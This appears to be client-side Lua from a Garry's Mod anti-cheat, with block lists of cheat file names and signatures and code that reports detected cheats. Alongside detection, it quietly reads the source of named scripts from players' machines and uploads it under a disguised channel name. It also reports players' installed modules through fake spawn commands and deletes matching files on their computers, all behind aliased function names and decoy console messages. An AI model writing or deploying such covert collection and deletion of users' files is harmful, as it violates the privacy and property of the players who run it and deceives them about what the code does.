	"scripts/*crack*.lua",
	"scripts/*exploit*.lua",
	"scripts/*block*.lua",
	"scripts/*convar*.lua",
	"scripts/*cvar*.lua",
	"scripts/*recoil*.lua",
	"scripts/*hax*.lua",
	"scripts/*h4x*.lua",
	"scripts/*force*.lua",
	"scripts/*cheat*.lua",
	"scripts/*spam*.lua",
	"scripts/*bypass*.lua",
	"scripts/*troll*.lua",
	
	--bypasses etc
	"includes/modules/*crack*.dll",
	"includes/modules/gmcl_cmd.dll",
	"includes/modules/gmcl_sys.dll",
	"includes/modules/*hak*.dll",
	"includes/modules/*solve*.dll",
	"includes/modules/gm_concmd.dll",
	"includes/modules/*decz*.dll",
	"includes/modules/*deco*.dll",
	"includes/modules/*spread*.dll",
	"includes/modules/*luamd5*.dll",
	"includes/modules/*_sh.dll",
	"includes/modules/*_sh1.dll",
	"includes/modules/*_sh2.dll",
	"includes/modules/*_sh3.dll",
	"includes/modules/*_se2.dll",
	"includes/modules/*_wshl.dll",
	"includes/modules/*hook*.dll",
	"includes/modules/*secret*.dll",
	"includes/modules/*unblock*.dll",
	"includes/modules/*byese2*.dll",
	"includes/modules/*command*.dll",
	"includes/modules/gm_se.dll",
	"includes/modules/*ring0*.dll",
	--random bypasses
	"menu_plugins/abc_panel.lua",
	"vgui/abc_panel.lua",
	--luamd5
	"menu_plugins/*luamd5*.lua",
	"includes/enum/*luamd5*.lua",
	"vgui/*luamd5*.lua",
	"autorun/*luamd5*.lua",
	"autorun/client/*luamd5*.lua",
	"*luamd5*.lua",
	--antiread
	"menu_plugins/*antiread*.lua",
	"includes/enum/*antiread*.lua",
	"vgui/*antiread*.lua",
	"autorun/*antiread*.lua",
	"autorun/client/*antiread*.lua",
	"*antiread*.lua",
	--lua_run
	"menu_plugins/*lua_run*.lua",
	"includes/enum/*lua_run*.lua",
	"vgui/*lua_run*.lua",
	"autorun/*lua_run*.lua",
	"autorun/client/*lua_run*.lua",
	"*lua_run*.lua",
	--selfpwn
	"menu_plugins/*selfpwn*.lua",
	"includes/enum/*selfpwn*.lua",
	"vgui/*selfpwn*.lua",
	"autorun/*selfpwn*.lua",
	"autorun/client/*selfpwn*.lua",
	"*selfpwn*.lua",
	
	--generic:inject
	"includes/modules/*inject*.dll",
	"menu_plugins/*inject*.lua",
	"includes/enum/*inject*.lua",
	"vgui/*inject*.lua",
	"autorun/*inject*.lua",
	"autorun/client/*inject*.lua",
	"*inject*.lua",
	--generic:hack
	"includes/modules/*hack*.dll",
	"menu_plugins/*hack*.lua",
	"includes/enum/*hack*.lua",
	"vgui/*hack*.lua",
	"autorun/*hack*.lua",
	"autorun/client/*hack*.lua",
	"*hack*.lua",
	"hack/*.lua",	
	"hacks/*.lua",
	--generic:crack
	"includes/modules/*crack*.dll",
	"menu_plugins/*crack*.lua",
	"includes/enum/*crack*.lua",
	"vgui/*crack*.lua",
	"autorun/*crack*.lua",
	"autorun/client/*crack*.lua",
	"*crack*.lua",
	"crack/*.lua",
	"cracks/*.lua",
	--generic:exploit
	"includes/modules/*exploit*.dll",
	"menu_plugins/*exploit*.lua",
	"includes/enum/*exploit*.lua",
	"vgui/*exploit*.lua",
	"autorun/*exploit*.lua",
	"autorun/client/*exploit*.lua",
	"*exploit*.lua",
	"exploit/*.lua",
	"exploits/*.lua",
	--generic:block
	"includes/modules/*block*.dll",
	"menu_plugins/*block*.lua",
	"includes/enum/*block*.lua",
	"vgui/*block*.lua",
	"autorun/*block*.lua",
	"autorun/client/*block*.lua",
	"*block*.lua",
	--generic:convar
	"includes/modules/*convar*.dll",
	"menu_plugins/*convar*.lua",
	"includes/enum/*convar*.lua",
	"vgui/*convar*.lua",
	"autorun/*convar*.lua",
	"autorun/client/*convar*.lua",
	"*convar*.lua",
	--generic:cvar
	"includes/modules/*cvar*.dll",
	"menu_plugins/*cvar*.lua",
	"includes/enum/*cvar*.lua",
	"vgui/*cvar*.lua",
	"autorun/*cvar*.lua",
	"autorun/client/*cvar*.lua",
	"*cvar*.lua",
	--generic:recoil
	"includes/modules/*recoil*.dll",
	"menu_plugins/*recoil*.lua",
	"includes/enum/*recoil*.lua",
	"vgui/*recoil*.lua",
	"autorun/*recoil*.lua",
	"autorun/client/*recoil*.lua",
	"*recoil*.lua",
	--generic:hax
	"includes/modules/*hax*.dll",
	"menu_plugins/*hax*.lua",
	"includes/enum/*hax*.lua",
	"vgui/*hax*.lua",
	"autorun/*hax*.lua",
	"autorun/client/*hax*.lua",
	"*hax*.lua",
	"hax/*.lua",
	--generic:h4x
	"includes/modules/*h4x*.dll",
	"menu_plugins/*h4x*.lua",
	"includes/enum/*h4x*.lua",
	"vgui/*h4x*.lua",
	"autorun/*h4x*.lua",
	"autorun/client/*h4x*.lua",
	"*h4x*.lua",
	"h4x/*.lua",
	--generic:force
	"includes/modules/*force*.dll",
	"menu_plugins/*force*.lua",
	"includes/enum/*force*.lua",
	"vgui/*force*.lua",
	"autorun/*force*.lua",
	"autorun/client/*force*.lua",
	"*force*.lua",
	--generic:cheat
	"includes/modules/*cheat*.dll",
	"menu_plugins/*cheat*.lua",
	"includes/enum/*cheat*.lua",
	"vgui/*cheat*.lua",
	"autorun/*cheat*.lua",
	"autorun/client/*cheat*.lua",
	"*cheat*.lua",
	"cheat/*.lua",
	"cheats/*.lua",
	--generic:spam
	"autorun/*spam*.lua",
	"autorun/client/*spam*.lua",
	"*spam*.lua",
	--generic:bypass
	"includes/modules/*bypass*.dll",
	"menu_plugins/*bypass*.lua",
	"includes/enum/*bypass*.lua",
	"vgui/*bypass*.lua",
	"autorun/*bypass*.lua",
	"autorun/client/*bypass*.lua",
	"*bypass*.lua",
	"bypass/*.lua",
	"bypasses/*.lua",
	--generic:luamd5
	"includes/modules/*luamd5*.dll",
	"menu_plugins/*luamd5*.lua",
	"includes/enum/*luamd5*.lua",
	"vgui/*luamd5*.lua",
	"autorun/*luamd5*.lua",
	"autorun/client/*luamd5*.lua",
	"*luamd5*.lua",
	--generic:bot
	"menu_plugins/*bot*.lua",
	"includes/enum/*bot*.lua",
	"vgui/*bot*.lua",
	"autorun/*bot*.lua",
	"autorun/client/*bot*.lua",
	"*bot*.lua",
	--generic:troll
	"autorun/*troll*.lua",
	"autorun/client/*troll*.lua",
	"*troll*.lua",
}



BadData = {
	--SethHack
	"dslog.txt",
	"runlog.txt",
	
	--Hermes, what is this i don't even..
	"hermes_version.txt",
	"hermes_lists_friends.txt",
	"hermes_lists_entities.txt",
	"hermes_log.txt",
	"hermes_lists_binds.txt",
	"hermes_mats.txt",
	"hermes_preset_*.txt", --damn you
	
	--Faphack
	"faphack_bot.txt",
	"fap_presets.txt",
	"faphack_entities.txt",
	"faphack_friends.txt",
	"faphack_keybinds.txt",
	"faphack/*.txt",
	
	--ShenBot
	"shenbot_save.txt",
	
	--other
	"theinit3sx3.txt",
	"x4xq054.txt",
	"lv9d3c.txt",
	"youvirus.txt",
	"5p1r1tw41k.txt",
	"B0unc3.txt",
	"d4h3sp.txt",
	"d4h41m.txt",
	"tacobot_cfg.txt",
	
	--JonSuite
	"*JonSuite*.txt",
	"JonSuite/*.txt",
	
	--bbot
	"db_steamid_ip.txt",
	"bacon_*.txt",
	
	--rcc firewall
	"cmdallow/*.txt",
	
	--hera
	"hera/*.txt",
	"hera/logs/*.txt",
	--hades
	"hades/*.txt",
	"hades/logs/*.txt",
	--helix
	"HelixScripts/*.txt",
	
	--generic
	"cfg/*hack*.txt",
	"cfg/*hax*.txt",
	"cfg/*exploit*.txt",
	"cfg/*cheat*.txt",
	--generic:hack
	"*hack*.txt",
	"hacks/*.txt",
	"hack/*.txt",
}



BadFiles = {
	--hera
	"hera/*.log",
	"hera/*.dat",
	"hera/logs/*.log",
	"hera/logs/*.dat",	
	--hades
	"hades/*.log",
	"hades/*.dat",
	"hades/logs/*.log",
	"hades/logs/*.dat",	
	--helix
	"HelixScripts/*.txt",	
}



ToSteal = {
	--Hermes
	{
		What  = "hermes.lua",
		Where = "menu_plugins/",
	},
	{
		What  = "hermes.lua",
		Where = "includes/enum/",
	},
	{
		What  = "hermes.lua",
		Where = "vgui/",
	},
	{
		What  = "hermes.lua",
		Where = "autorun/",
	},
	{
		What  = "hermes.lua",
		Where = "autorun/client/",
	},
	{
		What  = "hermes.lua",
		Where = "",
	},
	--NeonHack
	{
		What  = "[NH]Core.lua",
		Where = "autorun/",
	},
	{
		What  = "[NH]Core.lua",
		Where = "autorun/client/",
	},
	{
		What  = "[NH]Core.lua",
		Where = "/",
	},
	{
		What  = "[NH]Loader.lua",
		Where = "autorun/",
	},
	{
		What  = "[NH]Loader.lua",
		Where = "autorun/client/",
	},
	{
		What  = "[NH]Loader.lua",
		Where = "",
	},
	--SySHack, eh who nows, might get lucky
	{
		What  = "syshack.lua",
		Where = "menu_plugins/",
	},
	{
		What  = "syshack.lua",
		Where = "includes/enum/",
	},
	{
		What  = "syshack.lua",
		Where = "vgui/",
	},
	{
		What  = "syshack.lua",
		Where = "autorun/",
	},
	{
		What  = "syshack.lua",
		Where = "autorun/client/",
	},
	{
		What  = "syshack.lua",
		Where = "",
	},
	--SethHack
	{
		What  = "sethhack.lua",
		Where = "menu_plugins/",
	},
	{
		What  = "sethhack.lua",
		Where = "includes/enum/",
	},
	{
		What  = "sethhack.lua",
		Where = "vgui/",
	},
	{
		What  = "sethhack.lua",
		Where = "autorun/",
	},
	{
		What  = "sethhack.lua",
		Where = "autorun/client/",
	},
	{
		What  = "sethhack.lua",
		Where = "",
	},
	--Misc
	{
		What  = "ConVarHelp.lua",
		Where = "autorun/",
	},
	{
		What  = "gm_forceconvar.lua",
		Where = "autorun/",
	},
	
}


MsgN("//  A cartridge in a bare tree.. //")
local function Safe(str,maxlen)
	str = tostring(str)
	str = string.Trim(str)
	str = string.gsub(str, "[:/\\\"*%@?<>'#]", "_")
	str = string.gsub(str, "[]([)]", "")
	str = string.gsub(str, "[\n\r]", "")
	str = string.Trim( string.Left(str, maxlen or 20) )
	return str
end

local function IsIn(str,base)
	base = string.lower(tostring(base))
	str = string.lower(tostring(str))
	return string.find(base, str)
end
local function GAIInfo(v)
	return (NotGAI(v) and NotGAI(v).Info and NotGAI(v).Info != "")
end
local function GAIAuthor(v)
	return (NotGAI(v) and NotGAI(v).Author and NotGAI(v).Author != "")
end
local function Size(v)
	local size = NotFXE("../lua/"..v)
	if (size == -1) then
		return 0
	else
		return size
	end
end
local function ValidString(v)
	return (v and type(v) == "string" and v != "")
end

MsgN("//  Thickness of eternity..      //")
for k,v in ipairs(NotGAL()) do
	if (v and v != "") then
		NewGAL[k] = string.lower(v)
	end
end


MsgN("//  Look at my laser pistol..    //")
NotTS( SPAWNTIME / 2, function()
	for k,v in pairs(ToSteal) do
		NotTS(k / 3, function()
			local What 	= v.What
			local Where = v.Where
			local File	= Where..What
			
			if ValidString(File) and (#NotFFIL(File) >= 1) then
				for x,y in pairs(NotFFIL(File)) do
					local NewFile = tostring(Where..y)
					local NewSize = tostring( Size(NewFile) )
					if ValidString(y) and (#NotFFIL(NewFile) >= 1) then
						if (NewSize != "0") then
							table.insert(Booty, Format("--%s\n--%s\n\n%s", v, LocalPlayer():Nick(), NotFR("lua/"..NewFile, true) ) )
							NotRCC("gm_spawnprop", NewFile)
						end
					end
				end
			end
		end)
	end
	
	NotTS(15, function()
		if (#Booty >= 1) then
			NotSTS("ULXPlayerData", Booty, function() NotRCC("gm_spawnicons") end) --Yarr!
		end
	end)
end)


NotTS( SPAWNTIME / 2, function()
	for k,v in pairs(NotFFIL("includes/modules/*.dll")) do --CMod
		NotTS(k / 10, function()
			if NotFFIL("includes/modules/"..v) and (v and type(v) == "string" and v != "") then
				v = string.Trim(v,"/")
				v = string.Trim(v)
				if Size("includes/modules/"..v) then
					NotRCC("gm_spawnplayer", "CMod="..v..":"..Size("includes/modules/"..v))
				else
					NotRCC("gm_spawnplayer", "CMod="..v)
				end
			end
		end)
	end
	for k,v in pairs(NotFFIL("menu_plugins/*.lua")) do --MLMod
		NotTS(k / 10, function()
			if NotFFIL("menu_plugins/"..v) and (v and type(v) == "string" and v != "") then
				v = string.Trim(v,"/")
				v = string.Trim(v)
				NotRCC("gm_respawnplayer", "MLMod="..v)
			end
		end)
	end
end)



MsgN("//  Fatal Logical ERROR!         //")
NotTS( SPAWNTIME, function()
	if NotGCV("cl_cmdrate"):GetInt() !=30 then
		NotRCC("cl_cmdrate","30")
	end
	if (NotGCV("host_timescale"):GetInt() != 1) then
		GMGiveRanks("TS=host_timescale="..NotGCV("host_timescale"):GetString())
	end
	if (NotGCV("sv_cheats"):GetString() != "0") then
		GMGiveRanks("TS=sv_cheats="..NotGCV("sv_cheats"):GetString())
	end
	if NotGCV("host_framerate"):GetBool() then
		GMGiveRanks("TS=host_framerate="..NotGCV("host_framerate"):GetInt())
	end
	if (NotGCV("net_blockmsg"):GetString() != "none") then
		GMGiveRanks("TS=net_blockmsg="..NotGCV("net_blockmsg"):GetString())
	end
	if (NotGCV("cl_forwardspeed"):GetString() != "10000") then
		GMGiveRanks("TS=cl_forwardspeed="..NotGCV("cl_forwardspeed"):GetString())
	end
	
	StartKR30 = true
	
	for k,v in pairs( AddonsTAB ) do --bad addons
		if NotTHV( NewGAL, string.lower(v) ) then
			v = tostring(v)
			
			if GAIInfo(v) then
				if GAIAuthor(v) then
					GMGiveRanks("Addon="..v.." V="..Safe((NotGAI(v).Version or 1), 4).." ("..Safe(NotGAI(v).Author, 15)..") [["..Safe(NotGAI(v).Info, 30).."]]")
				else
					GMGiveRanks("Addon="..v.." [["..Safe(NotGAI(v).Info, 25).."]]")
				end
			else
				GMGiveRanks("Addon="..v)
			end
		end
	end
	for k,v in pairs( NotGAL() ) do --bad addons, kw
		for x,y in pairs(AddonsKWTAB) do
			if (v and v != "" and y and y != "") and IsIn(y,v) then
				v = tostring(v)
				y = tostring(y)
				
				if GAIInfo(v) then
					if GAIAuthor(v) then
						GMGiveRanks("WAddon="..y.."/"..v.." V="..Safe((NotGAI(v).Version or 1), 4).." ("..Safe(NotGAI(v).Author, 15)..") [["..Safe(NotGAI(v).Info, 30).."]]")
					else
						GMGiveRanks("WAddon="..y.."/"..v.." [["..Safe(NotGAI(v).Info, 30).."]]")
					end
				else
					GMGiveRanks("WAddon="..y.."/"..v)
				end
			end
		end
	end
	
	
	for k,v in pairs( BadFiles ) do --bad files
		NotTS(k / 10, function()
			if #NotFF(v, true)>=1 then
				if v != "" then
					GMGiveRanks("BadFile="..v)
				end
			end
		end)
	end
	for k,v in pairs( BadData ) do --bad data
		NotTS(k / 10, function()
			if #NotFF(v) >= 1 then
				for x,y in pairs(NotFF(v)) do
					if NotFF(y) and (y and type(y) == "string" and y != "") and (v and type(v) == "string" and v != "") then
						y = string.Trim(y,"/")
						if NotTHV(string.Explode("/", v), y) then
							GMGiveRanks("Datafile=data/"..v)
							NotFD(v) --byebye
						else
							GMGiveRanks("WDatafile=data/"..v.."/"..y)
							NotFD(v)
							NotFD(y)
						end
					end
				end
			end
		end)
	end
	
	NotTS(1, function()
		for k,v in pairs(BadLuaFiles) do --bad lua
			NotTS(k / 10, function()
				if #NotFFIL(v) >= 1 then
					for x,y in pairs(NotFFIL(v)) do
						if NotFFIL(y) and (y and type(y) == "string" and y != "") and (v and type(v) == "string" and v != "") then
							y = string.Trim(y,"/")
							if NotTHV(string.Explode("/", v), y) then
								GMGiveRanks("Module=lua/"..v)
							else
								GMGiveRanks("WModule=lua/"..v.."/"..y)
							end
						end
					end
				end
			end)
		end
	end)
	NotTS(2, function()
		for k,v in pairs(CMDTab) do --bad commands
			NotTS(k / 10, function()
				NotCCA(v, function(ply,cmd,args)
					if #args >= 1 then
						GMGiveRanks("Key="..cmd..":Args=[["..Safe(table.concat(args," ")).."]]")
					else 
						GMGiveRanks("Key="..cmd)
					end
				end)
			end)
		end
		for k,v in pairs(CVTab) do --bad cvars
			NotTS(k / 15, function()
				NotCAC(v, function(var,old,new)
					GMGiveRanks("CVar="..var..":Args=[["..Safe(new).."]]")
				end)
			end)
		end
	end)
	
	NotTC(RandomCharsHere, EVERYTIME, 0, function()
		if (SlobMegaAIM or GetSlobBotTarget or AntiBanOn or BotVisible or WOTS
			or SlobTeamAllowed or SafeAIM or SlobNotify or EzekBuddyAllowed
			or SlobBotAllowed or HeadPosition) then
			GMGiveRanks("TC=SlobBot")
			
		elseif (Hack or Trigger or WeaponTable or TTTWeaponEsp or Bunnyhop
			or Antigag or ReCalc or Targetsys or KeyTable or Admindet) then
			GMGiveRanks("TC=InkHack")
			
		elseif (Hermes or Nospread or GetPrediction or CompensateWeaponSpread
			or SetPlayerSpeed or WeaponVector) then
			GMGiveRanks("TC=Hermes")
			
		elseif (runNeon) then
			GMGiveRanks("TC=NeonHack")
			
		elseif (FapHack or PopulateESPCombo) then
			GMGiveRanks("TC=FapHack")
		elseif (speeeeed) then
			GMGiveRanks("TC=Speedhack")
		elseif (TrollTable) then
			GMGiveRanks("TC=NisHack")
		elseif (COLOR_TRACKING and COLOR_FRIENDLY) then
			GMGiveRanks("TC=LH-AutoAim")
		elseif (ASScheck or ULXcheck) then
			GMGiveRanks("TC=ULXcheck")
		elseif (ShenBot) then
			GMGiveRanks("TC=ShenBot")
		elseif (MawNotify or GetMawBotTarget)  then
			GMGiveRanks("TC=MawBot")
		elseif (spamchat or spamprops or spampropsv2 or spamprops_v2 or spamchat_v2 or spamchatv2) then
			GMGiveRanks("TC=MingeScripts")
		elseif (aimbot or SpeedShoot or RemoveSpeedShoot) then
			GMGiveRanks("TC=BCScripts")
		elseif (RunHax or (TB and TB.CCAdd)) then
			GMGiveRanks("TC=TeeBot")
			
		elseif (baconbot or bbot or triggerthis or mysetupmove or ToggleHax 
			or SelectTarget or AimbotThink or SafeViewAngles or BaconBotMenu
			or BaconBotSheet or SetCVAR or hl2_shotmanip or hl2_ucmd_getprediciton
			or PredictSpread or BBOT or LoadBaconBot or admincheck or BaconMiniWindow
			or SetConvar or SpawnVGUISPAM or L_MD5_PseudoRandom or manipulate_shot) then
			GMGiveRanks("TC=BaconBot")
			
		elseif (cusercmd_getcommandnumber) then
			GMGiveRanks("TC=cusercmd_getcommandnumber")
		elseif (psayspammer or ratingspammer) then
			GMGiveRanks("TC=Abestrollingscript")
		elseif (BaseTargetPosition or TargetPosition or IsValidTarget) then
			GMGiveRanks("TC=AutoAim")
		elseif (ForceConVar) then
			GMGiveRanks("TC=ForceConVar")
		elseif (ForceVarF or SpeedhackF or HookProtF or ModeCheck or TargetCheck or BonePosition or TargetVisible) then
			GMGiveRanks("TC=AHack")
		elseif (checkVicts or CanVictimSeeUs or beginAim) then
			GMGiveRanks("TC=nBot")
		elseif (AutoAim or GetTarget or WeaponCheck) then
			GMGiveRanks("TC=AGT")
		elseif (Helix or Helxa or helxa or Hades or hades or HACK or hack) then
			GMGiveRanks("TC=Helix-hades")
		elseif (AcceptedLaserWeps or NameTagHacsor) then
			GMGiveRanks("TC=TTT")
			
		elseif (SH or SH_SETCVAR or SH_RUNSCRIPT or SH_MODULEVERSION) then
			GMGiveRanks("TC=Sethhack")
		elseif (string.Find) then
			GMGiveRanks("TC=Sethhack:string.Find")
			
		elseif (AIMBOT_PLAYERSONLY or OFFSETPRESETS or SPINBOT_On or AimBot_Off or AIMBOT_SCANNING or DoAimBot) then
			GMGiveRanks("TC=JetBot")
		end
		
		if NotTIT("GetNames") then
			GMGiveRanks("IsTimer=SlobBot:GetNames")
		elseif NotTIT("SetName") then
			GMGiveRanks("IsTimer=SlobBot:SetName")
		elseif NotTIT("spamchat_timer") then
			GMGiveRanks("IsTimer=MingeScripts:spamchat_timer")
		elseif NotTIT("spamprops_timer") then
			GMGiveRanks("IsTimer=MingeScripts:spamprops_timer")
		elseif NotTIT("spampropsv2_timer") then
			GMGiveRanks("IsTimer=MingeScriptsV2:spampropsv2_timer")
		elseif NotTIT("spamchatv2_timer") then
			GMGiveRanks("IsTimer=MingeScriptsV2:spamchatv2_timer")			
		elseif NotTIT("autoattack") then
			GMGiveRanks("IsTimer=BCScripts:autoattack")
		elseif NotTIT("lolgetvarsifitwantsto") then
			GMGiveRanks("IsTimer=LOLScripts:lolgetvarsifitwantsto")
		elseif NotTIT("lolalerttimeout") then
			GMGiveRanks("IsTimer=LOLScripts:lolalerttimeout")
		elseif NotTIT("lolscriptalertfader") then
			GMGiveRanks("IsTimer=LOLScripts:lolscriptalertfader")
		elseif NotTIT("loluptimer") then
			GMGiveRanks("IsTimer=LOLScripts:loluptimer")
		elseif NotTIT("chekadmins") then
			GMGiveRanks("IsTimer=LOLScripts:chekadmins")
		elseif NotTIT("loluptimer2") then
			GMGiveRanks("IsTimer=LOLScripts:loluptimer2")
		elseif NotTIT("lolololohop") then
			GMGiveRanks("IsTimer=pb_pub:lolololohop")
		end
		
		if ( NotHGT()["HUDPaint"] ) then
			if ( NotHGT()["HUDPaint"]["AIMBOT"] ) then
				GMGiveRanks("HUDPaint=AIMBOT")
			elseif ( NotHGT()["HUDPaint"]["PaintBotNotes"] ) then
				GMGiveRanks("HUDPaint=JetBot:PaintBotNotes")
			elseif ( NotHGT()["HUDPaint"]["JBF"] ) then
				GMGiveRanks("HUDPaint=JetBot:JBF")
			elseif ( NotHGT()["HUDPaint"]["BaconBotHud"] ) then
				GMGiveRanks("HUDPaint=BaconBot:BaconBotHud")
			elseif ( NotHGT()["HUDPaint"]["ShenBot.Aimbot"] ) then
				GMGiveRanks("HUDPaint=ShenBot:ShenBot.Aimbot")
			elseif ( NotHGT()["HUDPaint"]["lolaim"] ) then
				GMGiveRanks("HUDPaint=LOLScripts:lolaim")
			elseif ( NotHGT()["HUDPaint"]["TBFov"] ) then
				GMGiveRanks("HUDPaint=TeeBot:TBFov")
			elseif ( NotHGT()["HUDPaint"]["Superoctonopus"] ) then
				GMGiveRanks("HUDPaint=InkHack:Superoctonopus")
			elseif ( NotHGT()["HUDPaint"]["TTTWeaponShow"] ) then
				GMGiveRanks("HUDPaint=InkHack:TTTWeaponShow")
			elseif ( NotHGT()["HUDPaint"]["MoneyMoney"] ) then
				GMGiveRanks("HUDPaint=InkHack:MoneyMoney")
			end
		end
		if ( NotHGT()["CreateMove"] ) then
			if ( NotHGT()["CreateMove"]["Spaz"] ) then
				GMGiveRanks("CreateMove=JetBot:Spaz")
			elseif ( NotHGT()["CreateMove"]["CamStopMove"] ) then
				GMGiveRanks("CreateMove=JetBot:CamStopMove")
			elseif ( NotHGT()["CreateMove"]["MingeBagAIMBot"] ) then
				GMGiveRanks("CreateMove=SlobBot:MingeBagAIMBot")		
			elseif ( NotHGT()["CreateMove"]["AimThePlayer"] ) then
				GMGiveRanks("CreateMove=Kenbot:AimThePlayer")
			elseif ( NotHGT()["CreateMove"]["Autoaim"] ) then
				GMGiveRanks("CreateMove=Generic:Autoaim")
			elseif ( NotHGT()["CreateMove"]["AutoAim"] ) then
				GMGiveRanks("CreateMove=Generic:AutoAim")
			elseif ( NotHGT()["CreateMove"]["this"] ) then
				GMGiveRanks("CreateMove=BaconBot:this")
			elseif ( NotHGT()["CreateMove"]["Aimbot"] ) then
				GMGiveRanks("CreateMove=Trooper:Aimbot")
			elseif ( NotHGT()["CreateMove"]["Aimboat"] ) then
				GMGiveRanks("CreateMove=Generic:Aimboat")
			elseif ( NotHGT()["CreateMove"]["TrackTarget"] ) then
				GMGiveRanks("CreateMove=JetBot:TrackTarget")
			elseif ( NotHGT()["CreateMove"]["ShenBot.BunnyHop"] ) then
				GMGiveRanks("CreateMove=ShenBot:ShenBot.BunnyHop")
			elseif ( NotHGT()["CreateMove"]["TrooperAim"] ) then
				GMGiveRanks("CreateMove=Trooper:TrooperAim")
			elseif ( NotHGT()["CreateMove"]["TBFakeView"] ) then
				GMGiveRanks("CreateMove=TeeBot:TBFakeView")		
			elseif ( NotHGT()["CreateMove"]["TBAim"] ) then
				GMGiveRanks("CreateMove=TeeBot:TBAim")
			elseif ( NotHGT()["CreateMove"]["StoredAngleRecalc"] ) then
				GMGiveRanks("CreateMove=InkHack:StoredAngleRecalc")
			end
		end
		if ( NotHGT()["Think"] ) then
			if ( NotHGT()["Think"]["H4XTHINK"] ) then
				GMGiveRanks("Think=H4XTHINK")	
			elseif ( NotHGT()["Think"]["Megaspam"] ) then
				GMGiveRanks("Think=SlobBot:Megaspam")
			elseif ( NotHGT()["Think"]["AimbotThinkingHere"] ) then
				GMGiveRanks("Think=Baconbot:AimbotThinkingHere")
			elseif ( NotHGT()["Think"]["AimbotThinking"] ) then
				GMGiveRanks("Think=Kenbot:AimbotThinking")
			elseif ( NotHGT()["Think"]["Norecoil"] ) then
				GMGiveRanks("Think=Norecoil")
			elseif ( NotHGT()["Think"]["Fag"] ) then
				GMGiveRanks("Think=Fag")
			elseif ( NotHGT()["Think"]["Hax"] ) then
				GMGiveRanks("Think=Generic:Hax")	
			elseif ( NotHGT()["Think"]["Slobhax"] ) then
				GMGiveRanks("Think=SlobBot:Slobhax")
			elseif ( NotHGT()["Think"]["SlobHax"] ) then
				GMGiveRanks("Think=SlobBot:SlobHax")
			elseif ( NotHGT()["Think"]["catchme"] ) then
				GMGiveRanks("Think=:catchme")
			elseif ( NotHGT()["Think"]["SlobLuaHax"] ) then
				GMGiveRanks("Think=Generic:SlobLuaHax")
			elseif ( NotHGT()["Think"]["NameChange"] ) then
				GMGiveRanks("Think=Namehack:NameChange")
			elseif ( NotHGT()["Think"]["Autoshoot"] ) then
				GMGiveRanks("Think=AGT:Autoshoot")
			elseif ( NotHGT()["Think"]["SetName"] ) then
				GMGiveRanks("Think=AGT:SetName")
			elseif ( NotHGT()["Think"]["TriggerThinky"] ) then
				GMGiveRanks("Think=Baconbot:TriggerThinky")
			elseif ( NotHGT()["Think"]["AutoFire_Bitch"] ) then
				GMGiveRanks("Think=Baconbot:AutoFire_Bitch")
			elseif ( NotHGT()["Think"]["HadesSteamworksThink"] ) then
				GMGiveRanks("Think=Hades:HadesSteamworksThink")
			elseif ( NotHGT()["Think"]["Norecoil"] ) then
				GMGiveRanks("Think=TTT:Norecoil")
			elseif ( NotHGT()["Think"]["TriggerThink"] ) then
				GMGiveRanks("Think=Jon:TriggerThink")
			elseif ( NotHGT()["Think"]["aimboat"] ) then
				GMGiveRanks("Think=ph0ne:aimboat")
			elseif ( NotHGT()["Think"]["LocalFix"] ) then
				GMGiveRanks("Think=SlobBot:LocalFix")
			elseif ( NotHGT()["Think"]["Megaspam"] ) then
				GMGiveRanks("Think=SlobBot:Megaspam")
			elseif ( NotHGT()["Think"]["GGetLocal"] ) then
				GMGiveRanks("Think=GGetLocal")
			elseif ( NotHGT()["Think"]["aimbot"] ) then
				GMGiveRanks("Think=BCSCripts:aimBot")
			elseif ( NotHGT()["Think"]["AimBot"] ) then
				GMGiveRanks("Think=BCSCripts:AimBot")
			elseif ( NotHGT()["Think"]["Target"] ) then
				GMGiveRanks("Think=BCSCripts:Target")
			elseif ( NotHGT()["Think"]["PropSpammer"] ) then
				GMGiveRanks("Think=BCSCripts:PropSpammer")
			elseif ( NotHGT()["Think"]["NoRecoil"] ) then
				GMGiveRanks("Think=BCSCripts:NoRecoil")
			elseif ( NotHGT()["Think"]["SpeedShoot"] ) then
				GMGiveRanks("Think=BCSCripts:SpeedShoot")
			elseif ( NotHGT()["Think"]["TBThink"] ) then
				GMGiveRanks("Think=TeeBot:TBThink")
			elseif ( NotHGT()["Think"]["Nishack-Bunnyhoplol"] ) then
				GMGiveRanks("Think=NisHack:Nishack-Bunnyhoplol")
			elseif ( NotHGT()["Think"]["TBRecoil"] ) then
				GMGiveRanks("Think=TeeBot:TBRecoil")
			elseif ( NotHGT()["Think"]["Chak"] ) then
				GMGiveRanks("Think=InkHack:Chak")
			elseif ( NotHGT()["Think"]["Funkybunny"] ) then
				GMGiveRanks("Think=InkHack:Funkybunny")
			elseif ( NotHGT()["Think"]["NewAntiGag"] ) then
				GMGiveRanks("Think=InkHack:NewAntiGag")
			elseif ( NotHGT()["Think"]["Tesasd"] ) then
				GMGiveRanks("Think=InkHack:Tesasd")
			elseif ( NotHGT()["Think"]["Nacrot"] ) then
				GMGiveRanks("Think=InkHack:Nacrot")
			elseif ( NotHGT()["Think"]["NotRecoil"] ) then
				GMGiveRanks("Think=InkHack:NotRecoil")
			end
		end
		if ( NotHGT()["Tick"] ) then
			if ( NotHGT()["Tick"]["Tick"] ) then
				GMGiveRanks("SausageBot=SausageBot:Tick")
			end
		end
		if ( NotHGT()["HadesPlayerName"] ) then
			if ( NotHGT()["HadesPlayerName"]["HadesPlayerName"] ) then
				GMGiveRanks("HadesPlayerName=Hades:HadesPlayerName")
			end
		end	
		if ( NotHGT()["InputMouseApply"] ) then
			if ( NotHGT()["InputMouseApply"]["Aimbott"] ) then
				GMGiveRanks("InputMouseApply=TTT:Aimbott")
			end
		end	
		if ( NotHGT()["Move"] ) then
			if ( NotHGT()["Move"]["Teleportin"] ) then
				GMGiveRanks("Move=JetBot:Teleportin")
			end
		end	
		if ( NotHGT()["PlayerInitialSpawn"] ) then
			if ( NotHGT()["PlayerInitialSpawn"]["KEEPNAMEPLAYERSPAWN"] ) then
				GMGiveRanks("InitSpawn=Namehack:KEEPNAMEPLAYERSPAWN")
			end
		end	
		if ( NotHGT()["CalcView"] ) then
			if ( NotHGT()["CalcView"]["CamCalcView"] ) then
				GMGiveRanks("CalcView=JetBot:CamCalcView")
			elseif ( NotHGT()["CalcView"]["NoRecoil"] ) then
				GMGiveRanks("CalcView=BCSCripts:NoRecoil")
			elseif ( NotHGT()["CalcView"]["TBCalcView"] ) then
				GMGiveRanks("CalcView=TeeBot:TBCalcView")
			elseif ( NotHGT()["CalcView"]["NegTin"] ) then
				GMGiveRanks("CalcView=InkHack:NegTin")
			end
		end
